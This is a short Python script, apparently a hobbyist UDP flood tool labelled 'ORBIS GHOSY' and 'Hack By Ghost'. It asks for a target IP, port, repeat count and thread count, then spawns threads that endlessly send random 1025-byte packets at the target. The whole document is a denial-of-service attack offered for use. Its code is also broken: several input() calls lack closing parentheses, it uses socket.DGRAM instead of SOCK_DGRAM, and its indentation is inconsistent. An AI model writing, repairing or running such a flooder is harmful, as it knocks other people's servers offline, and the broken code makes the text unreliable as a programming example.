import random
import socket
import threading

print("ORBIS GHOSY")

ip = str(input("Ip :")
port = int(input("Port :")
times = int(input("Times :")
threads = int(input("Threads :")

def udp():
    data = random._urandom(1025)
    while True:
        try:
         s = socket.socket(socket.AF_INET,socket.DGRAM)
         addr = (str(ip),int(port))
         for x in range(times):
            s.sendto(data,addr)
            print("Hack By Ghost")
        except:
            print("Server Down")

for y in range(threads):
     th = threading.Thread(target = udp)
     th.start() 